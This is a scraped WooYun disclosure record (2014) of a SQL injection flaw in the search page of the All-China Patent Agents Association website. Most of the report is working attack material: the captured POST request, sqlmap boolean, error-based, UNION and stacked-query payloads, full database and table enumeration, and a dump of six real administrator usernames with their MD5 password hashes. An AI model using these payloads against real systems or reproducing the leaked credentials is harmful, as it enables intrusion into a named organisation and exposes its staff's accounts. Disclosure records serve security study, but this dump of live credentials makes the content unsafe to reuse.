{"id": 56300, "wybug_id": "wooyun-2014-058269", "wybug_title": "中华全国专利代理人协会sql注入漏洞", "wybug_corp": "中华全国专利代理人协会", "wybug_author": "bitcoin", "wybug_date": "2014-04-24 15:58", "wybug_open_date": "2014-06-08 15:59", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "注射", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-24：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-06-08：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 中华全国专利代理人协会sql注入漏洞 详细说明：  注入点：首页http://www.acpaa.cn/的搜索处。burp抓包POST /search.asp HTTP/1.1Host: www.acpaa.cnProxy-Connection: keep-aliveContent-Length: 42Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Origin: http://www.acpaa.cnUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://www.acpaa.cn/index.aspAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: ASPSESSIONIDCSCBQCBB=LIJAJBBAKOICDBKGEEECPFBAkeyword=11&imageField.x=22&imageField.y=12对keyword过滤不严，导致注入请出sqlmapPlace: POSTParameter: keyword    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: keyword=11%' AND 9752=9752 AND '%'='&imageField.x=22&imageField.y=12    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: keyword=11%' AND 6045=CONVERT(INT,(SELECT CHAR(113)+CHAR(97)+CHAR(105)+CHAR(100)+CHAR(113)+(SELECT (CASE WHEN (6045=6045) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(111)+CHAR(106)+CHAR(121)+CHAR(113))) AND '%'='&imageField.x=22&imageField.y=12    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: keyword=-7378%' UNION ALL SELECT NULL,CHAR(113)+CHAR(97)+CHAR(105)+CHAR(100)+CHAR(113)+CHAR(70)+CHAR(72)+CHAR(81)+CHAR(71)+CHAR(98)+CHAR(119)+CHAR(88)+CHAR(76)+CHAR(87)+CHAR(122)+CHAR(113)+CHAR(111)+CHAR(106)+CHAR(121)+CHAR(113),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- &imageField.x=22&imageField.y=12    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: keyword=11%'; WAITFOR DELAY '0:0:5'--&imageField.x=22&imageField.y=12web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2000available databases [8]:[*] acpaanew[*] agents_Association[*] master[*] model[*] msdb[*] Northwind[*] pubs[*] tempdbDatabase: msdb[82 tables]+-----------------------------+| RTblClassDefs               || RTblDBMProps                || RTblDBXProps                || RTblDTMProps                || RTblDTSProps                || RTblDatabaseVersion         || RTblEQMProps                || RTblEnumerationDef          || RTblEnumerationValueDef     || RTblGENProps                || RTblIfaceDefs               || RTblIfaceHier               || RTblIfaceMem                || RTblMDSProps                || RTblNamedObj                || RTblOLPProps                || RTblParameterDef            || RTblPropDefs                || RTblProps                   || RTblRelColDefs              || RTblRelshipDefs             || RTblRelshipProps            || RTblRelships                || RTblSIMProps                || RTblScriptDefs              || RTblSites                   || RTblSumInfo                 || RTblTFMProps                || RTblTypeInfo                || RTblTypeLibs                || RTblUMLProps                || RTblUMXProps                || RTblVersionAdminInfo        || RTblVersions                || RTblWorkspaceItems          || backupfile                  || backupmediafamily           || backupmediaset              || backupset                   || log_shipping_databases      || log_shipping_monitor        || log_shipping_plan_databases || log_shipping_plan_history   || log_shipping_plans          || log_shipping_primaries      || log_shipping_secondaries    || logmarkhistory              || mswebtasks                  || restorefilegroup            || restorefilegroup            || restorehistory              || sqlagent_info               || sysalerts                   || syscachedcredentials        || syscategories               || sysconstraints              || sysdbmaintplan_databases    || sysdbmaintplan_history      || sysdbmaintplan_jobs         || sysdbmaintplans             || sysdownloadlist             || sysdtscategories            || sysdtspackagelog            || sysdtspackages              || sysdtssteplog               || sysdtstasklog               || sysjobhistory               || sysjobs_view                || sysjobs_view                || sysjobschedules             || sysjobservers               || sysjobsteps                 || sysnotifications            || sysoperators                || syssegments                 || systargetservergroupmembers || systargetservergroups       || systargetservers_view       || systargetservers_view       || systaskids                  || systasks_view               || systasks_view               |+-----------------------------+Database: acpaanew[35 tables]+----------------+| Adv            || CG_Admin       || CG_Config      || News1          || News2          || News3          || News_cat1      || News_cat2      || agency_grade   || agency_grade   || agent_batch    || agent_batch    || agent_grade    || agent_grant    || apply_grade    || apply_grade    || area           || course         || dtproperties   || essay          || lawsuit        || member         || note           || pay            || project        || record         || register_error || register_error || sysconstraints || syssegments    || tally          || train_apply    || train_apply    || train_b        || ymq_v_Channel  |+----------------+Database: acpaanewTable: CG_Admin[7 columns]+--------------+----------+| Column       | Type     |+--------------+----------+| admin        | nvarchar || flag         | ntext    || ID           | int      || isadmin      | int      || lastlogin    | datetime || rank         | int      || userpassword | nvarchar |+--------------+----------+Database: acpaanewTable: CG_Admin[6 entries]+-------+----------------------------------+| admin | userpassword                     |+-------+----------------------------------+| acpaa | 993E00ECB3FCE3C4F87C2F560375CA78 || cw    | 827CCB0EEA8A706C4C34A16891F84E7B || dwjl  | C4F9F48F8526F3F0680B3C26C4DE79EE || hy    | 96E79218965EB72C92A549DD5A330112 || px    | 379EF4BD50C30E261CCFB18DFC626D9F || xx    | A926D4A5F5FF3F419907C92BC9523A91 |+-------+----------------------------------+   漏洞证明：  如上   修复方案：  过滤   版权声明：转载请注明来源 bitcoin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}